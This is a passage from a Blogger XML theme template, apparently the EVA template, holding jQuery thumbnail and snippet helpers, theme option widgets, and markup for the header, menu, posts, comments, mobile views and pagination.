$(document).ready(function() {
$(".block-image .thumb").each(function() {
        $(this).find("img").attr("src", function(e, t) {
            return t.replace("/default.jpg", "/maxresdefault.jpg")
        })
    });
  });

function removeHtmlTag(strx,chop){
if(strx.indexOf("<")!=-1)
{
var s = strx.split("<");
for(var i=0;i<s.length;i++){
if(s[i].indexOf(">")!=-1){
s[i] = s[i].substring(s[i].indexOf(">")+1,s[i].length);
}
}
strx = s.join("");
}
chop = (chop < strx.length-1) ? chop : strx.length-2;
while(strx.charAt(chop-1)!=' ' && strx.indexOf(' ',chop)!=-1) chop++;
strx = strx.substring(0,chop-1);
return strx+'...';
}
function createSnippet(pID){
var div = document.getElementById(pID);
var summ = snippet_count;
var summary = '<div class="snippets">' + removeHtmlTag(div.innerHTML,summ) + '</div>';
div.innerHTML = summary;
}
          //]]>
        </script>
<script type='text/javascript'> 
//<![CDATA[
var no_image = "http://3.bp.blogspot.com/-Yw8BIuvwoSQ/VsjkCIMoltI/AAAAAAAAC4c/s55PW6xEKn0/s1600-r/nth.png";
var month_format = [, "Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sept", "Oct", "Nov", "Dec"];
var more_text = "View More";
var comments_text = "<span>Post </span>Comment";
var POSTPAGER_OLDER = "Older Article <i class='fa fa-chevron-circle-right' aria-hidden='true'></i>"; // post nav text "previous post"
var POSTPAGER_NEWER = "<i class='fa fa-chevron-circle-left' aria-hidden='true'></i> Newer Article"; // post nav text "next post"
//]]>
</script>
</head>
<body expr:class='data:blog.pageType'>
<div class='theme-opt' style='display:none'>
    <b:section class='option' id='option' maxwidgets='1' name='Theme Options' showaddelement='yes'>
      <b:widget id='HTML910' locked='true' title='PageNavi Results No.' type='HTML' version='1'>
        <b:widget-settings>
          <b:widget-setting name='content'/>
        </b:widget-settings>
        <b:includable id='main'>  
          <b:if cond='data:content == &quot;&quot;'>       
            <script type='text/javascript'>
              //<![CDATA[
              var perPage = 7;
              //]]>
            </script>
            <b:else/>
            &lt;script type=&#39;text/javascript&#39;&gt;
            //&lt;![CDATA[
                var perPage = <data:content/>;
            //]]&gt;
            &lt;/script&gt;
          </b:if>
        </b:includable>
      </b:widget>
      <b:widget id='HTML912' locked='true' title='Related Post No.' type='HTML' version='1'>
        <b:widget-settings>
          <b:widget-setting name='content'/>
        </b:widget-settings>
        <b:includable id='main'>  
          <b:if cond='data:content == &quot;&quot;'>       
            <script type='text/javascript'>
              //<![CDATA[
             var related_number = 4;
              //]]>
            </script>
            <b:else/>
            &lt;script type=&#39;text/javascript&#39;&gt;
            //&lt;![CDATA[
                var related_number = <data:content/>;
            //]]&gt;
            &lt;/script&gt;
          </b:if>
        </b:includable>
      </b:widget>
    </b:section>
  </div>
&lt;div id=&quot;outer-wrapper&quot; class=&quot;<data:blog.pageType/><b:if cond='data:blog.url == data:blog.homepageUrl'> home</b:if><b:if cond='data:blog.pageType == &quot;archive&quot;'> index</b:if>&quot;&gt;


<div id='header-wrapper' itemscope='itemscope' itemtype='http://schema.org/WPHeader'> 
<div class='tm-menu' id='stickymenu'>
<div class='row menu-wrap'>
        <b:section class='menu' id='menu' maxwidgets='1' name='Main Menu' showaddelement='yes'>
          <b:widget id='LinkList210' locked='true' title='Menu' type='LinkList' version='1'>
            <b:widget-settings>
              <b:widget-setting name='text-9'>Documentation</b:widget-setting>
              <b:widget-setting name='link-9'>http://www.sorabloggingtips.com/2017/09/how-to-setup-eva-blogger-template.html</b:widget-setting>
              <b:widget-setting name='text-8'>Seo Services</b:widget-setting>
              <b:widget-setting name='link-7'>way2themes</b:widget-setting>
              <b:widget-setting name='link-8'>http://www.shardawebservices.com/</b:widget-setting>
              <b:widget-setting name='text-10'>Download this template</b:widget-setting>
              <b:widget-setting name='link-5'>http://eva-way2themes.blogspot.in/p/page-markups-and-shortcodes.html</b:widget-setting>
              <b:widget-setting name='link-6'>http://www.sorabloggingtips.com/2017/01/how-to-add-sitemap-widget-in-blogspot-blogs.html</b:widget-setting>
              <b:widget-setting name='link-3'>#</b:widget-setting>
              <b:widget-setting name='link-4'>#</b:widget-setting>
              <b:widget-setting name='text-1'>_Multi DropDown</b:widget-setting>
              <b:widget-setting name='text-0'>Features</b:widget-setting>
              <b:widget-setting name='text-3'>__DropDown 2</b:widget-setting>
              <b:widget-setting name='text-2'>__DropDown 1</b:widget-setting>
              <b:widget-setting name='text-5'>_ShortCodes</b:widget-setting>
              <b:widget-setting name='text-4'>__DropDown 3</b:widget-setting>
              <b:widget-setting name='text-7'>_Error Page</b:widget-setting>
              <b:widget-setting name='text-6'>_SiteMap</b:widget-setting>
              <b:widget-setting name='sorting'>NONE</b:widget-setting>
              <b:widget-setting name='link-1'>#</b:widget-setting>
              <b:widget-setting name='link-2'>#</b:widget-setting>
              <b:widget-setting name='link-0'>#</b:widget-setting>
              <b:widget-setting name='link-10'>http://www.way2themes.com/2017/08/eva-fashion-blogger-template.html</b:widget-setting>
            </b:widget-settings>
            <b:includable id='main'>
            <div class='widget-content'>
              <ul itemscope='' itemtype='http://schema.org/SiteNavigationElement'> 
                <li><a expr:href='data:blog.homepageUrl'>Home</a></li>
                <b:loop values='data:links' var='link'>
                  <li itemprop='name'><a expr:href='data:link.target' itemprop='url'><data:link.name/></a></li>
                </b:loop>
              </ul>
            </div>
          </b:includable>
          </b:widget>
        </b:section>
<form _lpchecked='1' action='/search' class='search-form' id='searchform' method='get'>
                <fieldset> 
	              <input id='s' name='q' onfocus='if(this.value==&apos;Search&apos;)this.value=&apos;&apos;;' onwebkitspeechchange='transcribe(this.value)' type='text' value='Search' x-webkit-speech=''/> 
                  <button class='sbutton' id='search-image' style='border:0; vertical-align: top;background: transparent;'><i class='fa fa-search'/></button>
                </fieldset>
              </form>
  </div>
      </div>
<div style='clear: both;'/> 
<div class='row' id='header-wrappers'>
    <div class='headerleft'> 
      <b:section class='headerleft' id='headerleft' maxwidgets='1' showaddelement='no'>
         <b:widget id='Header1' locked='true' title='EVA (Header)' type='Header' version='1'>
           <b:widget-settings>
             <b:widget-setting name='displayUrl'>http://3.bp.blogspot.com/-PHvHrOGGGgM/Wak6CHlHASI/AAAAAAAADx4/EXgihWytvecl-54TpQv5JXNmWwepqqnFACK4BGAYYCw/s1600/eva.png</b:widget-setting>
             <b:widget-setting name='displayHeight'>89</b:widget-setting>
             <b:widget-setting name='sectionWidth'>792</b:widget-setting>
             <b:widget-setting name='useImage'>true</b:widget-setting>
             <b:widget-setting name='shrinkToFit'>false</b:widget-setting>
             <b:widget-setting name='imagePlacement'>BEFORE_DESCRIPTION</b:widget-setting>
             <b:widget-setting name='displayWidth'>277</b:widget-setting>
           </b:widget-settings>
           <b:includable id='main'>

  <b:if cond='data:useImage'>
    <b:if cond='data:imagePlacement == &quot;BEHIND&quot;'>
      <!--
      Show image as background to text. You can't really calculate the width
      reliably in JS because margins are not taken into account by any of
      clientWidth, offsetWidth or scrollWidth, so we don't force a minimum
      width if the user is using shrink to fit.
      This results in a margin-width's worth of pixels being cropped. If the
      user is not using shrink to fit then we expand the header.
      -->
      <b:if cond='data:mobile'>
        <div id='header-inner'>
          <div class='titlewrapper' style='background: transparent'>
            <h1 class='title' style='background: transparent; border-width: 0px'>
              <b:include name='title'/>
            </h1>
          </div>
          <b:include name='description'/>
        </div>
      <b:else/>
        <div expr:style='&quot;background-image: url(\&quot;&quot; + data:sourceUrl + &quot;\&quot;); &quot;                      + &quot;background-position: &quot;                      + data:backgroundPositionStyleStr + &quot;; &quot;                      + data:widthStyleStr                      + &quot;min-height: &quot; + data:height                      + &quot;_height: &quot; + data:height                      + &quot;background-repeat: no-repeat; &quot;' id='header-inner'>
          <div class='titlewrapper' style='background: transparent'>
            <h1 class='title' style='background: transparent; border-width: 0px'>
              <b:include name='title'/>
            </h1>
          </div>
          <b:include name='description'/>
        </div>
      </b:if>
    <b:else/>
      <!--Show the image only-->
      <div id='header-inner'>
        <a expr:href='data:blog.homepageUrl' style='display: block'><h1 style='display:none'/>
          <img expr:alt='data:title' expr:height='data:height' expr:id='data:widget.instanceId + &quot;_headerimg&quot;' expr:src='data:sourceUrl' expr:width='data:width' style='display: block'/>
        </a>
        <!--Show the description-->
        <b:if cond='data:imagePlacement == &quot;BEFORE_DESCRIPTION&quot;'>
          <b:include name='description'/>
        </b:if>
      </div>
    </b:if>
  <b:else/>
    <!--No header image -->
    <div id='header-inner'>
      <div class='titlewrapper'>
        <h1 class='title'>
          <b:include name='title'/>
        </h1>
      </div>
      <b:include name='description'/>
    </div>
  </b:if>
</b:includable>
           <b:includable id='description'>
  <div class='descriptionwrapper'>
    <p class='description'><span><data:description/></span></p>
  </div>
</b:includable>
           <b:includable id='title'>
  <b:if cond='data:blog.url == data:blog.homepageUrl'>
    <data:title/>
  <b:else/>
    <a expr:href='data:blog.homepageUrl'><data:title/></a>
  </b:if>
</b:includable>
         </b:widget>
       </b:section> 
</div>

<div style='clear: both;'/>
  </div>

    </div>

    <div class='row' id='content-wrapper'>

    <div id='main-wrapper'>
   <b:section class='main' id='main' showaddelement='yes'>
     <b:widget id='Blog1' locked='true' title='Blog Posts' type='Blog' version='1'>
       <b:widget-settings>
         <b:widget-setting name='showDateHeader'>true</b:widget-setting>
         <b:widget-setting name='style.textcolor'>#404040</b:widget-setting>
         <b:widget-setting name='showShareButtons'>true</b:widget-setting>
         <b:widget-setting name='authorLabel'>By</b:widget-setting>
         <b:widget-setting name='showCommentLink'>true</b:widget-setting>
         <b:widget-setting name='style.urlcolor'>#00a68e</b:widget-setting>
         <b:widget-setting name='showAuthor'>true</b:widget-setting>
         <b:widget-setting name='style.linkcolor'>#00a68e</b:widget-setting>
         <b:widget-setting name='style.unittype'>TextAndImage</b:widget-setting>
         <b:widget-setting name='style.bgcolor'>#ffffff</b:widget-setting>
         <b:widget-setting name='showAuthorProfile'>false</b:widget-setting>
         <b:widget-setting name='style.layout'>1x1</b:widget-setting>
         <b:widget-setting name='showLabels'>true</b:widget-setting>
         <b:widget-setting name='showLocation'>true</b:widget-setting>
         <b:widget-setting name='showTimestamp'>true</b:widget-setting>
         <b:widget-setting name='postsPerAd'>1</b:widget-setting>
         <b:widget-setting name='showBacklinks'>false</b:widget-setting>
         <b:widget-setting name='style.bordercolor'>#ffffff</b:widget-setting>
         <b:widget-setting name='showInlineAds'>false</b:widget-setting>
         <b:widget-setting name='showReactions'>false</b:widget-setting>
       </b:widget-settings>
       <b:includable id='main' var='top'>
  <b:if cond='!data:mobile'>
    <!-- posts -->
    <div class='blog-posts hfeed'>

      <b:include data='top' name='status-message'/>
 <b:loop values='data:posts' var='post'>
        <b:if cond='data:post.isDateStart and not data:post.isFirstPost'>
          &lt;/div&gt;&lt;/div&gt;
        </b:if>
        <b:if cond='data:post.isDateStart'>
          &lt;div class=&quot;date-outer&quot;&gt;
        </b:if>
        <b:if cond='data:post.dateHeader'>
          <h2 class='date-header'><span><data:post.dateHeader/></span></h2>
        </b:if>
        <b:if cond='data:post.isDateStart'>
          &lt;div class=&quot;date-posts&quot;&gt;
        </b:if>
        <div class='post-outer'>
          <b:include data='post' name='post'/>
          <b:include cond='data:blog.pageType in {&quot;static_page&quot;,&quot;item&quot;}' data='post' name='comment_picker'/>
        </div>

        <!-- Ad -->
        <b:if cond='data:post.includeAd'>
          <div class='inline-ad'>
            <data:adCode/>
          </div>
        </b:if>
      </b:loop>
      <b:if cond='data:numPosts != 0'>
        &lt;/div&gt;&lt;/div&gt;
      </b:if>
    </div>

    <!-- navigation -->
    <b:include name='nextprev'/>

    <!-- feed links -->
    <b:include name='feedLinks'/>

  <b:else/>
    <b:include name='mobile-main'/>
  </b:if>

  <b:if cond='data:top.showPlusOne'>
    <data:top.googlePlusBootstrap/>
  </b:if>

</b:includable>
       <b:includable id='backlinkDeleteIcon' var='backlink'>
  <span expr:class='&quot;item-control &quot; + data:backlink.adminClass'>
    <a expr:href='data:backlink.deleteUrl' expr:title='data:top.deleteBacklinkMsg'>
      <img src='https://resources.blogblog.com/img/icon_delete13.gif'/>
    </a>
  </span>
</b:includable>
       <b:includable id='backlinks' var='post'>
  <a name='links'/><h4><data:post.backlinksLabel/></h4>
  <b:if cond='data:post.numBacklinks != 0'>
    <dl class='comments-block' id='comments-block'>
      <b:loop values='data:post.backlinks' var='backlink'>
        <div class='collapsed-backlink backlink-control'>
          <dt class='comment-title'>
            <span class='backlink-toggle-zippy'>&#160;</span>
            <a expr:href='data:backlink.url' rel='nofollow'><data:backlink.title/></a>
            <b:include data='backlink' name='backlinkDeleteIcon'/>
          </dt>
          <dd class='comment-body collapseable'>
            <data:backlink.snippet/>
          </dd>
          <dd class='comment-footer collapseable'>
            <span class='comment-author'><data:post.authorLabel/> <data:backlink.author/></span>
            <span class='comment-timestamp'><data:post.timestampLabel/> <data:backlink.timestamp/></span>
          </dd>
        </div>
      </b:loop>
    </dl>
  </b:if>
  <p class='comment-footer'>
    <a class='comment-link' expr:href='data:post.createLinkUrl' expr:id='data:widget.instanceId + &quot;_backlinks-create-link&quot;' target='_blank'><data:post.createLinkLabel/></a>
  </p>
</b:includable>
       <b:includable id='comment-form' var='post'>
  <div class='comment-form'>
    <a name='comment-form'/>
    <b:if cond='data:mobile'>
      <h4 id='comment-post-message'>
        <a expr:id='data:widget.instanceId + &quot;_comment-editor-toggle-link&quot;' href='javascript:void(0)'><data:postCommentMsg/></a></h4>
      <p><data:blogCommentMessage/></p>
      <data:blogTeamBlogMessage/>
      <a expr:href='data:post.commentFormIframeSrc' id='comment-editor-src'/>
      <iframe allowtransparency='true' class='blogger-iframe-colorize blogger-comment-from-post' expr:height='data:cmtIframeInitialHeight' frameborder='0' id='comment-editor' name='comment-editor' src='' style='display: none' width='100%'/>
    <b:else/>
      <h4 id='comment-post-message'><data:postCommentMsg/></h4>
      <p><data:blogCommentMessage/></p>
      <data:blogTeamBlogMessage/>
      <a expr:href='data:post.commentFormIframeSrc' id='comment-editor-src'/>
      <iframe allowtransparency='true' class='blogger-iframe-colorize blogger-comment-from-post' expr:height='data:cmtIframeInitialHeight' frameborder='0' id='comment-editor' name='comment-editor' src='' width='100%'/>
    </b:if>
    <data:post.cmtfpIframe/>
    <script type='text/javascript'>
      BLOG_CMT_createIframe(&#39;<data:post.appRpcRelayPath/>&#39;);
    </script>
  </div>
</b:includable>
       <b:includable id='commentDeleteIcon' var='comment'>
  <span expr:class='&quot;item-control &quot; + data:comment.adminClass'>
    <b:if cond='data:showCmtPopup'>
      <div class='goog-toggle-button'>
        <div class='goog-inline-block comment-action-icon'/>
      </div>
    <b:else/>
      <a class='comment-delete' expr:href='data:comment.deleteUrl' expr:title='data:top.deleteCommentMsg'>
        <img src='https://resources.blogblog.com/img/icon_delete13.gif'/>
      </a>
    </b:if>
  </span>
</b:includable>
       <b:includable id='comment_count_picker' var='post'>
  <b:if cond='data:post.commentSource == 1'>
    <span class='cmt_count_iframe_holder' expr:data-count='data:post.numComments' expr:data-onclick='data:post.addCommentOnclick' expr:data-post-url='data:post.url' expr:data-url='data:post.url.canonical.http'>
    </span>
  <b:else/>
    <a class='comment-link' expr:href='data:post.addCommentUrl' expr:onclick='data:post.addCommentOnclick'>
      <data:post.commentLabelFull/>:
    </a>
  </b:if>
</b:includable>
       <b:includable id='comment_picker' var='post'>
  <b:if cond='data:post.commentSource == 1'>
    <b:include data='post' name='iframe_comments'/>
  <b:elseif cond='data:post.showThreadedComments'/>
    <b:include data='post' name='threaded_comments'/>
  <b:else/>
    <b:include data='post' name='comments'/>
  </b:if>
</b:includable>
       <b:includable id='comments' var='post'>
  <div class='comments' id='comments'>
    <a name='comments'/>
    <b:if cond='data:post.allowComments'>
      <h4><data:post.commentLabelFull/>:</h4>

      <b:if cond='data:post.commentPagingRequired'>
        <span class='paging-control-container'>
          <b:if cond='data:post.hasOlderLinks'>
            <a expr:class='data:post.oldLinkClass' expr:href='data:post.oldestLinkUrl'><data:post.oldestLinkText/></a>
              &#160;
            <a expr:class='data:post.oldLinkClass' expr:href='data:post.olderLinkUrl'><data:post.olderLinkText/></a>
              &#160;
          </b:if>

          <data:post.commentRangeText/>

          <b:if cond='data:post.hasNewerLinks'>
            &#160;
            <a expr:class='data:post.newLinkClass' expr:href='data:post.newerLinkUrl'><data:post.newerLinkText/></a>
            &#160;
            <a expr:class='data:post.newLinkClass' expr:href='data:post.newestLinkUrl'><data:post.newestLinkText/></a>
          </b:if>
        </span>
      </b:if>

      <div expr:id='data:widget.instanceId + &quot;_comments-block-wrapper&quot;'>
        <dl expr:class='data:post.avatarIndentClass' id='comments-block'>
          <b:loop values='data:post.comments' var='comment'>
            <dt expr:class='&quot;comment-author &quot; + data:comment.authorClass' expr:id='data:comment.anchorName'>
              <b:if cond='data:comment.favicon'>
                <img expr:src='data:comment.favicon' height='16px' style='margin-bottom:-2px;' width='16px'/>
              </b:if>
              <a expr:name='data:comment.anchorName'/>
              <b:if cond='data:blog.enabledCommentProfileImages'>
                <data:comment.authorAvatarImage/>
              </b:if>
              <b:if cond='data:comment.authorUrl'>
                <a expr:href='data:comment.authorUrl' rel='nofollow'><data:comment.author/></a>
              <b:else/>
                <data:comment.author/>
              </b:if>
              <data:commentPostedByMsg/>
            </dt>
            <dd class='comment-body' expr:id='data:widget.instanceId + data:comment.cmtBodyIdPostfix'>
              <b:if cond='data:comment.isDeleted'>
                <span class='deleted-comment'><data:comment.body/></span>
              <b:else/>
                <p>
                  <data:comment.body/>
                </p>
              </b:if>
            </dd>
            <dd class='comment-footer'>
              <span class='comment-timestamp'>
                <a expr:href='data:comment.url' title='comment permalink'>
                  <data:comment.timestamp/>
                </a>
                <b:include data='comment' name='commentDeleteIcon'/>
              </span>
            </dd>
          </b:loop>
        </dl>
      </div>

      <b:if cond='data:post.commentPagingRequired'>
        <span class='paging-control-container'>
          <a expr:class='data:post.oldLinkClass' expr:href='data:post.oldestLinkUrl'>
            <data:post.oldestLinkText/>
          </a>
          <a expr:class='data:post.oldLinkClass' expr:href='data:post.olderLinkUrl'>
            <data:post.olderLinkText/>
          </a>
          &#160;
          <data:post.commentRangeText/>
          &#160;
          <a expr:class='data:post.newLinkClass' expr:href='data:post.newerLinkUrl'>
            <data:post.newerLinkText/>
          </a>
          <a expr:class='data:post.newLinkClass' expr:href='data:post.newestLinkUrl'>
            <data:post.newestLinkText/>
          </a>
        </span>
      </b:if>

      <p class='comment-footer'>
        <b:if cond='data:post.embedCommentForm'>
          <b:if cond='data:post.allowNewComments'>
            <b:include data='post' name='comment-form'/>
          <b:else/>
            <data:post.noNewCommentsText/>
          </b:if>
        <b:elseif cond='data:post.allowComments'/>
          <a expr:href='data:post.addCommentUrl' expr:onclick='data:post.addCommentOnclick'><data:postCommentMsg/></a>
        </b:if>
      </p>
    </b:if>
    <b:if cond='data:showCmtPopup'>
      <div id='comment-popup'>
        <iframe allowtransparency='true' frameborder='0' id='comment-actions' name='comment-actions' scrolling='no'>
        </iframe>
      </div>
    </b:if>

    <div id='backlinks-container'>
    <div expr:id='data:widget.instanceId + &quot;_backlinks-container&quot;'>
       <b:include cond='data:post.showBacklinks' data='post' name='backlinks'/>
    </div>
    </div>
  </div>
</b:includable>
       <b:includable id='feedLinks'>
  <b:if cond='data:blog.pageType != &quot;item&quot;'> <!-- Blog feed links -->
    <b:if cond='data:feedLinks'>
      <div class='blog-feeds'>
      </div>
    </b:if>

  <b:else/> <!--Post feed links -->
    <div class='post-feeds'>
      <b:loop values='data:posts' var='post'>
        <b:include cond='data:post.allowComments and data:post.feedLinks' data='post.feedLinks' name='feedLinksBody'/>
      </b:loop>
    </div>
  </b:if>
</b:includable>
       <b:includable id='feedLinksBody' var='links'>
  <div class='feed-links'>
  <data:feedLinksMsg/>
  <b:loop values='data:links' var='f'>
     <a class='feed-link' expr:href='data:f.url' expr:type='data:f.mimeType' target='_blank'><data:f.name/> (<data:f.feedType/>)</a>
  </b:loop>
  </div>
</b:includable>
       <b:includable id='iframe_comments' var='post'>

  <b:if cond='data:post.allowIframeComments'>
    <script expr:src='data:post.iframeCommentSrc' type='text/javascript'/>
    <div class='cmt_iframe_holder' expr:data-href='data:post.url.canonical' expr:data-viewtype='data:post.viewType'/>

    <b:if cond='data:post.embedCommentForm == &quot;false&quot;'>
      <a expr:href='data:post.addCommentUrl' expr:onclick='data:post.addCommentOnclick'><data:postCommentMsg/></a>
    </b:if>
  </b:if>
</b:includable>
       <b:includable id='mobile-index-post' var='post'>
  <div class='mobile-date-outer date-outer'>
    <b:if cond='data:post.dateHeader'>
      <div class='date-header'>
        <span><data:post.dateHeader/></span>
      </div>
    </b:if>

    <div class='mobile-post-outer'>
      <a expr:href='data:post.url'>
        <h3 class='mobile-index-title entry-title' itemprop='name'>
          <data:post.title/>
        </h3>

        <div class='mobile-index-arrow'>&amp;rsaquo;</div>

        <div class='mobile-index-contents'>
          <b:if cond='data:post.thumbnailUrl'>
            <div class='mobile-index-thumbnail'>
              <div class='Image'>
                <img expr:src='data:post.thumbnailUrl'/>
              </div>
            </div>
          </b:if>

          <div class='post-body'>
            <b:if cond='data:post.snippet'><data:post.snippet/></b:if>
          </div>
        </div>

        <div style='clear: both;'/>
      </a>

      <div class='mobile-index-comment'>
        <b:include cond='data:blog.pageType != &quot;static_page&quot;                          and data:post.allowComments                          and data:post.numComments != 0' data='post' name='comment_count_picker'/>
      </div>
    </div>
  </div>
</b:includable>
       <b:includable id='mobile-main' var='top'>
    <!-- posts -->
    <div class='blog-posts hfeed'>

      <b:include data='top' name='status-message'/>

      <b:if cond='data:blog.pageType == &quot;index&quot;'>
        <b:loop values='data:posts' var='post'>
          <b:include data='post' name='mobile-index-post'/>
        </b:loop>
      <b:else/>
        <b:loop values='data:posts' var='post'>
          <b:include data='post' name='mobile-post'/>
        </b:loop>
      </b:if>
    </div>

   <b:include name='mobile-nextprev'/>
</b:includable>
       <b:includable id='mobile-nextprev'>
  <div class='blog-pager' id='blog-pager'>
    <b:if cond='data:newerPageUrl'>
      <div class='mobile-link-button' id='blog-pager-newer-link'>
      <a class='blog-pager-newer-link' expr:href='data:newerPageUrl' expr:id='data:widget.instanceId + &quot;_blog-pager-newer-link&quot;' expr:title='data:newerPageTitle'>&amp;lsaquo;</a>
      </div>
    </b:if>

    <b:if cond='data:olderPageUrl'>
      <div class='mobile-link-button' id='blog-pager-older-link'>
      <a class='blog-pager-older-link' expr:href='data:olderPageUrl' expr:id='data:widget.instanceId + &quot;_blog-pager-older-link&quot;' expr:title='data:olderPageTitle'>&amp;rsaquo;</a>
      </div>
    </b:if>

    <div class='mobile-link-button' id='blog-pager-home-link'>
    <a class='home-link' expr:href='data:blog.homepageUrl'><data:homeMsg/></a>
    </div>

    <div class='mobile-desktop-link'>
      <a class='home-link' expr:href='data:desktopLinkUrl'><data:desktopLinkMsg/></a>
    </div>

  </div>
  <div class='clear'/>
</b:includable>
       <b:includable id='mobile-post' var='post'>
  <div class='date-outer'>
    <b:if cond='data:post.dateHeader'>
      <h2 class='date-header'><span><data:post.dateHeader/></span></h2>
    </b:if>
    <div class='date-posts'>
      <div class='post-outer'>

        <div class='post hentry uncustomized-post-template' itemscope='itemscope' itemtype='http://schema.org/BlogPosting'>
          <b:if cond='data:post.thumbnailUrl'>
            <meta expr:content='data:post.thumbnailUrl' itemprop='image_url'/>
          </b:if>
          <meta expr:content='data:blog.blogId' itemprop='blogId'/>
          <meta expr:content='data:post.id' itemprop='postId'/>

          <a expr:name='data:post.id'/>
        <b:if cond='data:post.title'> 
                     <b:if cond='data:blog.pageType == &quot;index&quot;'> 
    <h2 class='post-title entry-title' itemprop='name'> 
     <b:if cond='data:post.link'> 
       <a expr:href='data:post.link' itemprop='url'><data:post.title/></a> 
     <b:else/> 
        <b:if cond='data:post.url'> 
<a expr:href='data:post.url' itemprop='url'><data:post.title/></a> 
<b:else/> 
          <data:post.title/> 
        </b:if> 
     </b:if> 
     </h2>
                       <b:elseif cond='data:blog.pageType == &quot;archive&quot;'/> 
<h2 class='post-title entry-title' itemprop='name'> 
     <b:if cond='data:post.link'> 
       <a expr:href='data:post.link' itemprop='url'><data:post.title/></a> 
     <b:else/> 
        <b:if cond='data:post.url'> 
<a expr:href='data:post.url' itemprop='url'><data:post.title/></a> 
<b:else/> 
          <data:post.title/> 
        </b:if> 
     </b:if> 
      </h2>
<b:else/> 
<h1 class='post-title entry-title' itemprop='name'> 
     <b:if cond='data:post.link'> 
       <data:post.title/> 
     <b:else/> 
        <b:if cond='data:post.url'> 
         <data:post.title/> 
<b:else/> 
          <data:post.title/> 
        </b:if> 
     </b:if> 
      </h1> 
</b:if> 
                    </b:if> 

          <div class='post-header'>
            <div class='post-header-line-1'/>
          </div>

          <div class='post-body entry-content' expr:id='&quot;post-body-&quot; + data:post.id' itemprop='articleBody'>
            <data:post.body/>
            <div style='clear: both;'/> <!-- clear for photos floats -->
          </div>

          <div class='post-footer'>
            <div class='post-footer-line post-footer-line-1'>
              <span class='post-author vcard'>
                <b:if cond='data:top.showAuthor'>
                  <b:if cond='data:post.authorProfileUrl'>
                    <span class='fn' itemprop='author' itemscope='itemscope' itemtype='http://schema.org/Person'>
                      <meta expr:content='data:post.authorProfileUrl' itemprop='url'/>
                      <a expr:href='data:post.authorProfileUrl' rel='author' title='author profile'>
                        <span itemprop='name'><data:post.author/></span>
                      </a>
                    </span>
                  <b:else/>
                    <span class='fn' itemprop='author' itemscope='itemscope' itemtype='http://schema.org/Person'>
                      <span itemprop='name'><data:post.author/></span>
                    </span>
                  </b:if>
                </b:if>
              </span>

              <span class='post-timestamp'>
                <b:if cond='data:top.showTimestamp'>
                  <data:top.timestampLabel/>
                  <b:if cond='data:post.url'>
                    <meta expr:content='data:post.canonicalUrl' itemprop='url'/>
                    <a class='timestamp-link' expr:href='data:post.url' rel='bookmark' title='permanent link'><abbr class='published' expr:title='data:post.timestampISO8601' itemprop='datePublished'><data:post.timestamp/></abbr></a>
                  </b:if>
                </b:if>
              </span>

              <span class='post-comment-link'>
                <b:include cond='data:blog.pageType not in {&quot;item&quot;,&quot;static_page&quot;}                                  and data:post.allowComments' data='post' name='comment_count_picker'/>
              </span>
            </div>

            <div class='post-footer-line post-footer-line-2'>
              <b:if cond='data:top.showMobileShare'>
                <div class='mobile-link-button goog-inline-block' id='mobile-share-button'>
                  <a href='javascript:void(0);'><data:shareMsg/></a>
                </div>
              </b:if>
              <b:if cond='data:top.showDummy'>
                <div class='goog-inline-block dummy-container'><data:post.dummyTag/></div>
              </b:if>
            </div>

          </div>
        </div>

        <b:include cond='data:blog.pageType in {&quot;static_page&quot;,&quot;item&quot;}' data='post' name='comment_picker'/>
      </div>
    </div>
  </div>
</b:includable>
       <b:includable id='nextprev'>
  <div class='blog-pager' id='blog-pager'>
    <b:if cond='data:newerPageUrl'>
      <span id='blog-pager-newer-link'>
      <a class='blog-pager-newer-link' expr:href='data:newerPageUrl' expr:id='data:widget.instanceId + &quot;_blog-pager-newer-link&quot;' expr:title='data:newerPageTitle'><data:newerPageTitle/></a>
      </span>
    </b:if>

    <b:if cond='data:olderPageUrl'>
      <span id='blog-pager-older-link'>
      <a class='blog-pager-older-link' expr:href='data:olderPageUrl' expr:id='data:widget.instanceId + &quot;_blog-pager-older-link&quot;' expr:title='data:olderPageTitle'><data:olderPageTitle/></a>
      </span>
    </b:if>

    <a class='home-link' expr:href='data:blog.homepageUrl'><data:homeMsg/></a>

    <b:if cond='data:mobileLinkUrl'>
      <div class='blog-mobile-link'>
        <a expr:href='data:mobileLinkUrl'><data:mobileLinkMsg/></a>
      </div>
    </b:if>

  </div>
  <div class='clear'/>
</b:includable>
       <b:includable id='post' var='post'>
  <div class='post hentry'> 
 
  <b:if cond='data:blog.pageType != &quot;item&quot;'>
                          <b:if cond='data:blog.pageType != &quot;static_page&quot;'>
                            <b:if cond='data:post.thumbnailUrl'>
                            
                                <div class='block-image'>
                                   <div class='thumb'>
  <a expr:href='data:post.url'>
                                  <script type='text/javascript'>
                                    document.write(bp_thumbnail_resize(&quot;<data:post.thumbnailUrl/>&quot;,&#39;<data:post.title/>&#39;));
                                  </script>
                                     </a>
                                  </div>
                                </div>
                             
                              <b:else/>
                                
                                   <div class='block-image'>
                                   <div class='thumb'>
<a expr:href='data:post.url'>
                                    <img expr:alt='data:post.title' expr:title='data:post.title' src='http://2.bp.blogspot.com/-IO-XEI1LgEs/VmPNKFp0BhI/AAAAAAAACOg/_JrYHMBXV5w/s260/nothumb.jpg'/>
                                     </a>
</div>

                                  </div>
                               
                              </b:if>
 <div style='clear: both;'/>
<div class='ty-index-head'>
          <b:if cond='data:post.title'>
              <font class='retitle'>
                <h2 class='post-title entry-title'>
                   <b:if cond='data:post.link'>
                    <a expr:href='data:post.link'>
                       <data:post.title/>
                      </a>
                      <b:else/>
                      <b:if cond='data:post.url'>
                       <a expr:href='data:post.url'>
                       <data:post.title/>
                      </a>
                      <b:else/>
                     <data:post.title/>
                     </b:if>
                   </b:if>
                  </h2>
                    </font>
                </b:if>
 <div id='meta-post'>
                      <span class='auth-meta'> <i class='fa fa-user'/> <a class='g-profile' expr:href='data:post.authorProfileUrl' expr:title='data:post.author' rel='author'>
                        <span itemprop='name'><data:post.author/></span></a> </span>
<span class='pub-meta'><i class='fa fa-calendar-o'/>
<abbr class='published timeago' expr:title='data:post.timestampISO8601'><data:post.timestamp/></abbr></span>
<span class='post-labels'>
<i aria-hidden='true' class='fa fa-folder-open'/>
        <b:if cond='data:post.labels'>
         <b:loop index='x' values='data:post.labels' var='label'>

    <b:if cond='data:x==0'> <a expr:href='data:label.url + &quot;?max-results=5&quot;' rel='tag nofollow'><data:label.name/></a> <b>,</b> </b:if>
